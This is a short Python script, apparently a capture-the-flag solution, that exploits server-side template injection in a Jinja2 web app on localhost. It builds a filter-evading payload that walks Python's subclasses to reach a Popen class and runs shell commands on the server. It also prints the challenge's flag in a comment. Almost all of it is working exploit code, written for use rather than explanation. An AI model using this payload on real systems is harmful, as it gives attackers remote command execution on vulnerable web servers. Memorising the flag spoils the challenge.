import requests
url = 'http://localhost:9016'
# {% for item in (((dict|attr("__base__"))|attr("__subcl" + "asses__")))() %}
# {% if "file" in (item|attr("__name__"))%}
# {{ item }}
# {{ loop|attr('index0') }}
# {% endif %}
# {% endfor %}
index_list_class = 39  # {{ dict|attr("__base__")|attr("__subcl" + "asses__")() }}
index_gevent_popen = 539
payload = """
{% set popen_cls = (((dict|attr("__base__"))|attr("__subcl" + "asses__")))()|attr("__getitem__")(539) %}
{{ popen_cls("cd into-the-woods; ls; cat ch4mpZZ", shell=True, stdout=-1)|attr("communicate")()}}
"""
params = {
    'q': payload
}
response = requests.get(url, params=params) # CSCE604258{SSt1_0h_SSTi__auth0r_bingung_nulis_flag}
print(response.text)